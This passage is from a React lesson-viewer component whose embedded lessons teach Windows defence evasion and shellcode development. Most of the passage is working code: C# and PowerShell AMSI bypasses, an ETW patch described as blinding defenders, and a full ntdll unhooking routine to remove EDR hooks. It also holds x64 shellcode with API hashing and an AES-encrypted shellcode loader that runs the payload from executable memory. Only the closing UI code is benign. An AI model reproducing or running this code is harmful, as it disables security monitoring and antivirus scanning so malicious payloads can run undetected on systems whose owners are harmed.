    static extern int AmsiInitialize(
        string appName, out IntPtr amsiContext);
    
    public static void ForceAMSIFailure() {
        // Trigger AMSI initialization with bad params
        // This can cause AMSI to fail open
        IntPtr ctx;
        AmsiInitialize(null, out ctx);
    }
    
    // Method 3: Context corruption
    public static bool CorruptAMSIContext() {
        try {
            IntPtr hAmsi = LoadLibrary("amsi.dll");
            IntPtr pAmsiContext = GetProcAddress(
                hAmsi, "AmsiInitialize");
            
            // Find AMSI_RESULT enum in memory
            // Set to AMSI_RESULT_CLEAN for all scans
            
            // (Advanced implementation left as exercise)
            
            return true;
        }
        catch {
            return false;
        }
    }
}

class Program {
    static void Main() {
        // Bypass AMSI
        if (AMSIBypass.PatchAMSI()) {
            Console.WriteLine("[+] AMSI bypassed");
            
            // Now we can run suspicious code
            ExecuteMaliciousScript();
        }
    }
    
    static void ExecuteMaliciousScript() {
        // Previously blocked by AMSI
        Console.WriteLine("Executing payload...");
    }
}

// OBFUSCATION METHOD
// ==================

class ObfuscatedAMSI {
    static void Main() {
        // Obfuscate "AMSI" string
        string a = "A" + "M" + "S" + "I";
        
        // Base64 obfuscation
        string b64 = "QW1zaVNjYW5CdWZmZXI=";  // AmsiScanBuffer
        string func = System.Text.Encoding.UTF8.GetString(
            Convert.FromBase64String(b64));
        
        // Now patch using obfuscated strings
    }
}

// POWERSHELL AMSI BYPASS
// ======================
/*
# Classic one-liner (often signature-detected now)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
    GetField('amsiInitFailed','NonPublic,Static').
    SetValue($null,$true)

# More advanced (memory patch)
$a=[Ref].Assembly.GetTypes();
Foreach($b in $a) {
    if ($b.Name -like "*iUtils") {
        $c=$b
    }
};
$d=$c.GetFields('NonPublic,Static');
Foreach($e in $d) {
    if ($e.Name -like "*Context") {
        $f=$e
    }
};
$g=$f.GetValue($null);
[IntPtr]$ptr=$g;
[Int32[]]$buf = @(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
*/`,
          language: "csharp"
        },
        {
          title: "2. ETW Patching - Blind the Defenders",
          content: `ETW (Event Tracing for Windows) provides telemetry to EDR. Patching ETW prevents your actions from being logged.

ETW EVENTS THAT EXPOSE YOU:
• PowerShell script blocks
• .NET assembly loads
• Process creation
• Thread creation
• Image loads

PATCHING TECHNIQUE:
• Find EtwEventWrite in ntdll.dll
• Patch with "ret" instruction (0xC3)
• All ETW logging fails silently`,
          code: `using System;
using System.Runtime.InteropServices;

class ETWBypass {
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(
        IntPtr hModule, string lpProcName);
    
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);
    
    public static bool PatchETW() {
        try {
            // Get ntdll.dll
            IntPtr hNtdll = GetModuleHandle("ntdll.dll");
            if (hNtdll == IntPtr.Zero) {
                Console.WriteLine("[-] Failed to get ntdll");
                return false;
            }
            
            // Get EtwEventWrite address
            IntPtr pEtwEventWrite = GetProcAddress(
                hNtdll, "EtwEventWrite");
            
            if (pEtwEventWrite == IntPtr.Zero) {
                Console.WriteLine("[-] EtwEventWrite not found");
                return false;
            }
            
            Console.WriteLine($"[*] EtwEventWrite at 0x{pEtwEventWrite:X}");
            
            // Patch bytes (x64)
            // 33 C0  xor eax, eax  (return 0)
            // C3     ret
            byte[] patch = { 0x33, 0xC0, 0xC3 };
            
            // Or simpler: just ret (may cause issues)
            // byte[] patch = { 0xC3 };
            
            // Change protection to RWX
            uint oldProtect;
            if (!VirtualProtect(pEtwEventWrite,
                (UIntPtr)patch.Length, 0x40, out oldProtect)) {
                Console.WriteLine("[-] VirtualProtect failed");
                return false;
            }
            
            // Apply patch
            Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);
            
            // Restore original protection
            VirtualProtect(pEtwEventWrite,
                (UIntPtr)patch.Length, oldProtect, out oldProtect);
            
            Console.WriteLine("[+] ETW patched successfully");
            return true;
        }
        catch (Exception ex) {
            Console.WriteLine($"[-] ETW patch failed: {ex.Message}");
            return false;
        }
    }
    
    // Alternative: Patch EtwEventWriteFull
    public static bool PatchETWFull() {
        try {
            IntPtr hNtdll = GetModuleHandle("ntdll.dll");
            IntPtr pEtw = GetProcAddress(hNtdll, "EtwEventWriteFull");
            
            if (pEtw == IntPtr.Zero) {
                return false;
            }
            
            byte[] patch = { 0x33, 0xC0, 0xC3 };
            uint oldProtect;
            
            VirtualProtect(pEtw, (UIntPtr)3, 0x40, out oldProtect);
            Marshal.Copy(patch, 0, pEtw, 3);
            VirtualProtect(pEtw, (UIntPtr)3, oldProtect, out oldProtect);
            
            Console.WriteLine("[+] EtwEventWriteFull patched");
            return true;
        }
        catch {
            return false;
        }
    }
}

// Combined bypass
class DefensiveEvasion {
    public static void BypassAll() {
        Console.WriteLine("[*] Bypassing defenses...");
        
        // 1. Patch AMSI
        if (AMSIBypass.PatchAMSI()) {
            Console.WriteLine("[+] AMSI bypassed");
        }
        
        // 2. Patch ETW
        if (ETWBypass.PatchETW()) {
            Console.WriteLine("[+] ETW blinded");
        }
        
        if (ETWBypass.PatchETWFull()) {
            Console.WriteLine("[+] ETW Full blinded");
        }
        
        Console.WriteLine("[+] All defenses bypassed");
        Console.WriteLine("[*] Ready for payload execution");
    }
}

class Program {
    static void Main() {
        DefensiveEvasion.BypassAll();
        
        // Now execute your payload with reduced visibility
        ExecutePayload();
    }
    
    static void ExecutePayload() {
        Console.WriteLine("[*] Payload executing...");
        // Your offensive operations here
    }
}

// DETECTION NOTES:
// ===============
// - Memory patching detected by some EDR
// - Suspicious VirtualProtect calls monitored
// - Consider indirect syscalls for patching
// - May need to disable PatchGuard on kernel
// - Test against specific EDR solutions`,
          language: "csharp"
        },
        {
          title: "3. API Unhooking - Removing EDR Hooks",
          content: `EDR vendors hook ntdll.dll functions to monitor behavior. Unhooking restores clean copies of these functions.

HOW EDR HOOKS WORK:
• DLL loads into your process
• Modifies start of ntdll functions
• Inserts JMP to EDR code
• EDR inspects parameters/behavior
• Allows or blocks operation

UNHOOKING TECHNIQUE:
• Read clean ntdll.dll from disk
• Parse PE to find .text section
• Copy clean .text over hooked version
• Now APIs call kernel directly`,
          code: `using System;
using System.Runtime.InteropServices;

class APIUnhooking {
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    static extern IntPtr CreateFileW(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateFileMappingW(
        IntPtr hFile,
        IntPtr lpAttributes,
        uint flProtect,
        uint dwMaximumSizeHigh,
        uint dwMaximumSizeLow,
        string lpName);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr MapViewOfFile(
        IntPtr hFileMappingObject,
        uint dwDesiredAccess,
        uint dwFileOffsetHigh,
        uint dwFileOffsetLow,
        UIntPtr dwNumberOfBytesToMap);
    
    [DllImport("kernel32.dll")]
    static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);
    
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);
    
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DOS_HEADER {
        public ushort e_magic;
        // ... (abbreviated)
        public int e_lfanew;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_NT_HEADERS {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER OptionalHeader;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_FILE_HEADER {
        public ushort Machine;
        public ushort NumberOfSections;
        // ... (abbreviated)
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER {
        public ushort Magic;
        // ... (abbreviated)
        public uint SizeOfImage;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_SECTION_HEADER {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public byte[] Name;
        public uint VirtualSize;
        public uint VirtualAddress;
        public uint SizeOfRawData;
        public uint PointerToRawData;
        // ... (abbreviated)
    }
    
    public static bool UnhookNtdll() {
        try {
            // 1. Get current ntdll base address
            IntPtr hNtdll = GetModuleHandle("ntdll.dll");
            if (hNtdll == IntPtr.Zero) {
                Console.WriteLine("[-] Failed to get ntdll");
                return false;
            }
            
            Console.WriteLine($"[*] Ntdll loaded at 0x{hNtdll:X}");
            
            // 2. Map clean ntdll from disk
            IntPtr hFile = CreateFileW(
                @"C:\\Windows\\System32\\ntdll.dll",
                0x80000000,  // GENERIC_READ
                1,           // FILE_SHARE_READ
                IntPtr.Zero,
                3,           // OPEN_EXISTING
                0,
                IntPtr.Zero);
            
            if (hFile == (IntPtr)(-1)) {
                Console.WriteLine("[-] Failed to open ntdll.dll");
                return false;
            }
            
            IntPtr hMapping = CreateFileMappingW(
                hFile, IntPtr.Zero, 2, 0, 0, null);  // PAGE_READONLY
            CloseHandle(hFile);
            
            if (hMapping == IntPtr.Zero) {
                Console.WriteLine("[-] CreateFileMapping failed");
                return false;
            }
            
            IntPtr pCleanNtdll = MapViewOfFile(
                hMapping, 4, 0, 0, UIntPtr.Zero);  // FILE_MAP_READ
            CloseHandle(hMapping);
            
            if (pCleanNtdll == IntPtr.Zero) {
                Console.WriteLine("[-] MapViewOfFile failed");
                return false;
            }
            
            Console.WriteLine($"[*] Clean ntdll mapped at 0x{pCleanNtdll:X}");
            
            // 3. Parse PE headers (clean copy)
            IMAGE_DOS_HEADER dosHeader = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(
                pCleanNtdll);
            
            IntPtr pNtHeaders = pCleanNtdll + dosHeader.e_lfanew;
            IMAGE_NT_HEADERS ntHeaders = Marshal.PtrToStructure<IMAGE_NT_HEADERS>(
                pNtHeaders);
            
            // 4. Find .text section
            IntPtr pSection = pNtHeaders + Marshal.SizeOf<IMAGE_NT_HEADERS>();
            
            for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++) {
                IMAGE_SECTION_HEADER section = 
                    Marshal.PtrToStructure<IMAGE_SECTION_HEADER>(
                        pSection + (i * Marshal.SizeOf<IMAGE_SECTION_HEADER>()));
                
                string sectionName = System.Text.Encoding.ASCII.GetString(
                    section.Name).TrimEnd('\\0');
                
                if (sectionName == ".text") {
                    Console.WriteLine($"[*] Found .text section");
                    Console.WriteLine($"    VA: 0x{section.VirtualAddress:X}");
                    Console.WriteLine($"    Size: 0x{section.VirtualSize:X}");
                    
                    // 5. Unhook: copy clean .text
                    IntPtr pHookedText = hNtdll + (int)section.VirtualAddress;
                    IntPtr pCleanText = pCleanNtdll + (int)section.VirtualAddress;
                    
                    // Change protection
                    uint oldProtect;
                    if (!VirtualProtect(pHookedText,
                        (UIntPtr)section.VirtualSize, 0x40, out oldProtect)) {
                        Console.WriteLine("[-] VirtualProtect failed");
                        UnmapViewOfFile(pCleanNtdll);
                        return false;
                    }
                    
                    // Copy clean bytes
                    byte[] cleanBytes = new byte[section.VirtualSize];
                    Marshal.Copy(pCleanText, cleanBytes, 0, (int)section.VirtualSize);
                    Marshal.Copy(cleanBytes, 0, pHookedText, (int)section.VirtualSize);
                    
                    // Restore protection
                    VirtualProtect(pHookedText,
                        (UIntPtr)section.VirtualSize, oldProtect, out oldProtect);
                    
                    Console.WriteLine("[+] Ntdll.dll unhooked!");
                    break;
                }
            }
            
            // Cleanup
            UnmapViewOfFile(pCleanNtdll);
            
            return true;
        }
        catch (Exception ex) {
            Console.WriteLine($"[-] Unhooking failed: {ex.Message}");
            return false;
        }
    }
}

class Program {
    static void Main() {
        Console.WriteLine("[*] Starting API unhooking...");
        
        if (APIUnhooking.UnhookNtdll()) {
            Console.WriteLine("[+] Ready for stealthy operations");
            // Now your syscalls bypass EDR hooks
        }
    }
}`,
          language: "csharp"
        }
      ]
    },
    "shellcode": {
      title: "Shellcode Development - Position Independent Code",
      sections: [
        {
          title: "1. x64 Assembly Fundamentals",
          content: `Shellcode is machine code that executes without dependencies. Understanding x64 assembly is essential for writing position-independent, compact payloads.

X64 CALLING CONVENTION (Windows):
• RCX - First argument
• RDX - Second argument
• R8  - Third argument
• R9  - Fourth argument
• Stack - Additional arguments
• RAX - Return value

PRESERVED REGISTERS:
• RBX, RBP, RDI, RSI, R12-R15 must be saved
• All others can be modified

SHELLCODE REQUIREMENTS:
• No absolute addresses (position independent)
• No static strings (use stack or RIP-relative)
• Resolve APIs dynamically
• Handle own imports`,
          code: `; Basic x64 shellcode structure (NASM syntax)
BITS 64

; Entry point
start:
    ; 1. Save registers (optional for shellcode)
    push rbx
    push rsi
    push rdi
    
    ; 2. Get PEB (Process Environment Block)
    ; fs:[0x30] = PEB on x64 Windows
    mov rax, [gs:0x60]        ; PEB pointer
    
    ; 3. Get kernel32.dll base from PEB
    mov rax, [rax + 0x18]     ; PEB->Ldr
    mov rsi, [rax + 0x20]     ; InMemoryOrderModuleList
    lodsq                      ; First entry (ntdll.dll)
    xchg rsi, rax
    lodsq                      ; Second entry (kernel32.dll)
    mov rbx, [rax + 0x20]     ; DllBase (kernel32)
    
    ; 4. Parse PE headers to find exports
    mov r8d, [rbx + 0x3C]     ; e_lfanew (PE header offset)
    lea r9, [rbx + r8]        ; NT headers
    mov r8d, [r9 + 0x88]      ; Export directory RVA
    lea r9, [rbx + r8]        ; Export directory
    
    ; 5. Find function by hash
    ; (See GetProcAddress implementation)
    
    ; 6. Call WinAPI functions
    ; LoadLibraryA, GetProcAddress, etc.
    
    ; 7. Execute payload
    call execute_payload
    
    ; 8. Cleanup and exit
    pop rdi
    pop rsi
    pop rbx
    ret

execute_payload:
    ; Your payload code here
    ; E.g., spawn cmd.exe, reverse shell, etc.
    ret

; ============================================
; FUNCTION: Find API by hash
; ============================================
; Input: RCX = DLL base, EDX = hash
; Output: RAX = function address

find_function:
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    
    mov rdi, rcx              ; DLL base
    mov r8d, [rdi + 0x3C]     ; e_lfanew
    lea r9, [rdi + r8]        ; NT headers
    mov r8d, [r9 + 0x88]      ; Export RVA
    lea r9, [rdi + r8]        ; Export directory
    
    mov ecx, [r9 + 0x18]      ; NumberOfNames
    mov r10d, [r9 + 0x20]     ; AddressOfNames RVA
    lea r10, [rdi + r10]      ; Names array
    
.loop:
    dec ecx
    mov esi, [r10 + rcx*4]    ; Name RVA
    lea rsi, [rdi + rsi]      ; Name string
    
    ; Hash the name
    xor rax, rax
    xor rbx, rbx
    
.hash_loop:
    lodsb                     ; Load byte
    test al, al               ; Check null terminator
    jz .hash_done
    ror rbx, 13               ; ROR13 hash
    add rbx, rax
    jmp .hash_loop
    
.hash_done:
    cmp ebx, edx              ; Compare with target hash
    jne .loop
    
    ; Found! Get function address
    mov r11d, [r9 + 0x24]     ; AddressOfNameOrdinals
    lea r11, [rdi + r11]
    movzx ecx, word [r11 + rcx*2]  ; Ordinal
    
    mov r11d, [r9 + 0x1C]     ; AddressOfFunctions
    lea r11, [rdi + r11]
    mov eax, [r11 + rcx*4]    ; Function RVA
    lea rax, [rdi + rax]      ; Function address
    
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    ret

; ============================================
; COMPLETE EXAMPLE: MessageBox shellcode
; ============================================

bits 64

start:
    ; Get kernel32 base
    xor rcx, rcx
    mov rax, [gs:rcx + 0x60]  ; PEB
    mov rax, [rax + 0x18]     ; Ldr
    mov rax, [rax + 0x20]     ; InMemoryOrderModuleList
    mov rax, [rax]            ; Second entry
    mov rax, [rax]            ; Third entry (kernel32)
    mov rbx, [rax + 0x20]     ; DllBase
    
    ; Get LoadLibraryA
    mov rcx, rbx
    mov edx, 0xec0e4e8e       ; Hash("LoadLibraryA")
    call find_function
    mov r15, rax              ; Save LoadLibraryA
    
    ; Load user32.dll
    lea rcx, [rel user32_dll]
    call r15                  ; LoadLibraryA("user32.dll")
    mov rbx, rax              ; user32 base
    
    ; Get MessageBoxA
    mov rcx, rbx
    mov edx, 0x384f8e8d       ; Hash("MessageBoxA")
    call find_function
    mov r14, rax              ; Save MessageBoxA
    
    ; Call MessageBoxA
    xor rcx, rcx              ; hWnd = NULL
    lea rdx, [rel msg_text]   ; lpText
    lea r8, [rel msg_title]   ; lpCaption
    xor r9, r9                ; uType = MB_OK
    call r14
    
    ret

user32_dll: db "user32.dll", 0
msg_text:   db "Shellcode!", 0
msg_title:  db "POC", 0

; Compile: nasm -f win64 shellcode.asm -o shellcode.obj
; Link: ld -m i386pep shellcode.obj -o shellcode.exe
; Extract: objcopy -O binary --only-section=.text shellcode.exe shellcode.bin`,
          language: "nasm"
        },
        {
          title: "2. API Hashing - Hiding Function Names",
          content: `API hashing dynamically resolves functions without storing their names. This avoids signature detection and makes reverse engineering harder.

WHY API HASHING:
• No function name strings in shellcode
• Smaller payload size
• Defeats string-based detection
• Standard technique in exploits

COMMON HASH ALGORITHMS:
• ROR13 - Most common, fast
• CRC32 - Good distribution
• FNV1a - Fast, simple
• Custom algorithms`,
          code: `// C implementation of ROR13 hash
#include <windows.h>
#include <stdio.h>

// ROR13 hash algorithm
DWORD HashString(const char* str) {
    DWORD hash = 0;
    
    while (*str) {
        hash = _rotr(hash, 13);  // Rotate right 13 bits
        hash += *str;
        str++;
    }
    
    return hash;
}

// Generate hash table
void GenerateHashes() {
    const char* functions[] = {
        "LoadLibraryA",
        "GetProcAddress",
        "VirtualAlloc",
        "CreateThread",
        "WaitForSingleObject",
        "ExitProcess",
        "MessageBoxA",
        "CreateProcessA"
    };
    
    printf("// API Hash Table\\n");
    printf("#define HASH_%-20s 0x%08X\\n\\n", 
           "LoadLibraryA", HashString("LoadLibraryA"));
    
    for (int i = 0; i < sizeof(functions)/sizeof(char*); i++) {
        printf("#define HASH_%-20s 0x%08X\\n",
               functions[i], HashString(functions[i]));
    }
}

// Find function by hash in export table
PVOID GetFunctionByHash(HMODULE hModule, DWORD dwHash) {
    BYTE* pBase = (BYTE*)hModule;
    
    // Parse PE headers
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = 
        (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    
    // Get export directory
    IMAGE_DATA_DIRECTORY exportDir = 
        pNt->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_EXPORT];
    
    PIMAGE_EXPORT_DIRECTORY pExport = 
        (PIMAGE_EXPORT_DIRECTORY)(pBase + 
                                  exportDir.VirtualAddress);
    
    // Get arrays
    DWORD* pNames = (DWORD*)(pBase + pExport->AddressOfNames);
    WORD* pOrdinals = (WORD*)(pBase + 
                              pExport->AddressOfNameOrdinals);
    DWORD* pFunctions = (DWORD*)(pBase + 
                                  pExport->AddressOfFunctions);
    
    // Search for hash
    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        const char* szName = (const char*)(pBase + pNames[i]);
        
        if (HashString(szName) == dwHash) {
            WORD ordinal = pOrdinals[i];
            PVOID pFunc = pBase + pFunctions[ordinal];
            return pFunc;
        }
    }
    
    return NULL;
}

// Example usage
#define HASH_LoadLibraryA      0xec0e4e8e
#define HASH_GetProcAddress    0x7c0dfcaa
#define HASH_VirtualAlloc      0x91afca54
#define HASH_CreateThread      0x799aacc6

typedef HMODULE (WINAPI *fnLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *fnGetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID (WINAPI *fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

int main() {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    
    // Resolve by hash
    fnLoadLibraryA pLoadLib = (fnLoadLibraryA)
        GetFunctionByHash(hKernel32, HASH_LoadLibraryA);
    
    fnGetProcAddress pGetProc = (fnGetProcAddress)
        GetFunctionByHash(hKernel32, HASH_GetProcAddress);
    
    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)
        GetFunctionByHash(hKernel32, HASH_VirtualAlloc);
    
    if (pLoadLib && pGetProc && pVirtualAlloc) {
        printf("[+] Functions resolved by hash\\n");
        
        // Use them normally
        HMODULE hUser32 = pLoadLib("user32.dll");
        // ...
    }
    
    return 0;
}

// ALTERNATIVE: CRC32 hashing
DWORD CRC32Hash(const char* str) {
    DWORD crc = 0xFFFFFFFF;
    
    while (*str) {
        crc ^= *str++;
        
        for (int i = 0; i < 8; i++) {
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
        }
    }
    
    return ~crc;
}

// Custom hash (more obscure)
DWORD CustomHash(const char* str) {
    DWORD hash = 5381;
    
    while (*str) {
        hash = ((hash << 5) + hash) + *str++;  // hash * 33 + c
    }
    
    return hash;
}`,
          language: "c"
        },
        {
          title: "3. Shellcode Encoders & Encryption",
          content: `Raw shellcode contains null bytes and suspicious patterns. Encoders transform shellcode into benign-looking data, with a decoder stub that reconstructs it at runtime.

COMMON ENCODERS:
• XOR - Simple, effective
• ROT-N - Caesar cipher
• Base64 - Looks like data
• Custom algorithms

ENCRYPTION:
• AES - Strong encryption
• RC4 - Lightweight stream cipher
• ChaCha20 - Modern, fast

STAGED SHELLCODE:
• Small Stage 1 downloads Stage 2
• Stage 2 is encrypted/encoded
• Evades size-based detection`,
          code: `#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>

// XOR Encoder/Decoder (simplest)
void XOREncode(BYTE* data, SIZE_T size, BYTE key) {
    for (SIZE_T i = 0; i < size; i++) {
        data[i] ^= key;
    }
}

// Multi-byte XOR
void XOREncodeMulti(BYTE* data, SIZE_T size, 
                    BYTE* key, SIZE_T keyLen) {
    for (SIZE_T i = 0; i < size; i++) {
        data[i] ^= key[i % keyLen];
    }
}

// Generate XOR decoder stub
void GenerateXORDecoder(BYTE key) {
    printf("; XOR Decoder Stub (NASM)\\n");
    printf("decoder_start:\\n");
    printf("    lea rsi, [rel shellcode]\\n");
    printf("    mov rcx, shellcode_len\\n");
    printf("decode_loop:\\n");
    printf("    xor byte [rsi], 0x%02X\\n", key);
    printf("    inc rsi\\n");
    printf("    loop decode_loop\\n");
    printf("    jmp shellcode\\n");
    printf("shellcode:\\n");
    printf("    ; Encoded shellcode here\\n");
}

// AES encryption for shellcode
BOOL AESEncrypt(BYTE* pData, DWORD dwDataLen,
                BYTE* pKey, DWORD dwKeyLen,
                BYTE** ppEncrypted, DWORD* pdwEncLen) {
    
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;
    BOOL bResult = FALSE;
    
    // Acquire context
    if (!CryptAcquireContextA(&hProv, NULL, NULL,
        PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }
    
    // Create hash of key
    if (!CryptCreateHash(hProv, CALG_SHA_256, 
        0, 0, &hHash)) {
        goto cleanup;
    }
    
    if (!CryptHashData(hHash, pKey, dwKeyLen, 0)) {
        goto cleanup;
    }
    
    // Derive AES key
    if (!CryptDeriveKey(hProv, CALG_AES_256, 
        hHash, 0, &hKey)) {
        goto cleanup;
    }
    
    // Allocate output buffer (size + padding)
    DWORD dwEncLen = dwDataLen + AES_BLOCK_SIZE;
    BYTE* pEncrypted = (BYTE*)malloc(dwEncLen);
    memcpy(pEncrypted, pData, dwDataLen);
    
    // Encrypt
    DWORD dwSize = dwDataLen;
    if (!CryptEncrypt(hKey, 0, TRUE, 0, 
        pEncrypted, &dwSize, dwEncLen)) {
        free(pEncrypted);
        goto cleanup;
    }
    
    *ppEncrypted = pEncrypted;
    *pdwEncLen = dwSize;
    bResult = TRUE;
    
cleanup:
    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    
    return bResult;
}

// Runtime decryption
BOOL AESDecrypt(BYTE* pEncrypted, DWORD dwEncLen,
                BYTE* pKey, DWORD dwKeyLen,
                BYTE** ppDecrypted, DWORD* pdwDecLen) {
    
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;
    BOOL bResult = FALSE;
    
    if (!CryptAcquireContextA(&hProv, NULL, NULL,
        PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }
    
    if (!CryptCreateHash(hProv, CALG_SHA_256, 
        0, 0, &hHash)) {
        goto cleanup;
    }
    
    if (!CryptHashData(hHash, pKey, dwKeyLen, 0)) {
        goto cleanup;
    }
    
    if (!CryptDeriveKey(hProv, CALG_AES_256, 
        hHash, 0, &hKey)) {
        goto cleanup;
    }
    
    // Allocate and decrypt
    BYTE* pDecrypted = (BYTE*)malloc(dwEncLen);
    memcpy(pDecrypted, pEncrypted, dwEncLen);
    
    DWORD dwSize = dwEncLen;
    if (!CryptDecrypt(hKey, 0, TRUE, 0, 
        pDecrypted, &dwSize)) {
        free(pDecrypted);
        goto cleanup;
    }
    
    *ppDecrypted = pDecrypted;
    *pdwDecLen = dwSize;
    bResult = TRUE;
    
cleanup:
    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    
    return bResult;
}

// Complete example: Encrypted shellcode loader
int main() {
    // Original shellcode (calc.exe example)
    BYTE shellcode[] = {
        0x90, 0x90, 0x90,  // NOP sled
        // ... actual shellcode
    };
    
    DWORD shellcodeLen = sizeof(shellcode);
    
    // Encryption key
    BYTE key[] = "MySecretKey123!";
    DWORD keyLen = sizeof(key) - 1;
    
    // Encrypt
    BYTE* pEncrypted = NULL;
    DWORD dwEncLen = 0;
    
    if (!AESEncrypt(shellcode, shellcodeLen,
        key, keyLen, &pEncrypted, &dwEncLen)) {
        printf("[-] Encryption failed\\n");
        return 1;
    }
    
    printf("[+] Encrypted %d bytes -> %d bytes\\n",
           shellcodeLen, dwEncLen);
    
    // At runtime: decrypt and execute
    BYTE* pDecrypted = NULL;
    DWORD dwDecLen = 0;
    
    if (!AESDecrypt(pEncrypted, dwEncLen,
        key, keyLen, &pDecrypted, &dwDecLen)) {
        printf("[-] Decryption failed\\n");
        return 1;
    }
    
    printf("[+] Decrypted %d bytes\\n", dwDecLen);
    
    // Allocate executable memory
    LPVOID pExec = VirtualAlloc(NULL, dwDecLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    
    memcpy(pExec, pDecrypted, dwDecLen);
    
    // Execute
    ((void(*)())pExec)();
    
    // Cleanup
    VirtualFree(pExec, 0, MEM_RELEASE);
    free(pDecrypted);
    free(pEncrypted);
    
    return 0;
}

#pragma comment(lib, "advapi32.lib")`,
          language: "c"
        }
      ]
    }
  };

  const currentLesson = lessons[moduleId];

  if (!currentLesson) {
    return (
      <Card className="p-8 bg-gradient-to-br from-card to-card/50 border-border/50 backdrop-blur">
        <div className="text-center space-y-4">
          <BookOpen className="h-16 w-16 text-muted-foreground/50 mx-auto" />
          <p className="text-lg text-muted-foreground">Select a module to begin your journey into systems programming</p>
          <p className="text-sm text-muted-foreground/70">Each module contains theory, practical examples, and working code</p>
        </div>
      </Card>
    );
  }

  return (
    <Card className="h-[600px] flex flex-col bg-card border-border shadow-lg">
      <div className="p-4 border-b border-border/50 flex items-center gap-3 bg-gradient-to-r from-primary/5 to-transparent">
        <div className="p-2 rounded-lg bg-primary/10">
          <BookOpen className="h-5 w-5 text-primary" />
        </div>
        <div className="flex-1">
          <h3 className="font-semibold text-foreground">{currentLesson.title}</h3>
          <p className="text-xs text-muted-foreground">{currentLesson.sections.length} sections</p>
        </div>
      </div>
      
      <ScrollArea className="flex-1 p-6">
        <div className="space-y-10">
          {currentLesson.sections.map((section: any, idx: number) => (
            <div key={idx} className="space-y-4 group">
              <div className="flex items-start gap-3">
                <div className="mt-1 w-8 h-8 rounded-full bg-primary/10 flex items-center justify-center text-sm font-bold text-primary shrink-0">
                  {idx + 1}
                </div>
                <div className="flex-1">
                  <h4 className="text-lg font-semibold text-foreground mb-2">{section.title}</h4>
                  <div className="prose prose-sm max-w-none">
                    <p className="text-sm text-muted-foreground whitespace-pre-line leading-relaxed">{section.content}</p>
                  </div>
                </div>
              </div>
              
              {section.code && (
                <div className="relative ml-11 group-hover:shadow-lg transition-shadow duration-200">
                  <div className="absolute top-3 right-3 z-10">
                    <Badge variant="secondary" className="text-xs font-mono">
                      {section.language}
                    </Badge>
                  </div>
                  <pre className="bg-muted/50 backdrop-blur p-5 rounded-lg overflow-x-auto text-xs border border-border/50">
                    <code className="text-foreground font-mono whitespace-pre leading-relaxed">{section.code}</code>
                  </pre>
                </div>
              )}
            </div>
          ))}
        </div>
      </ScrollArea>
    </Card>
  );
};

export default LessonViewer;
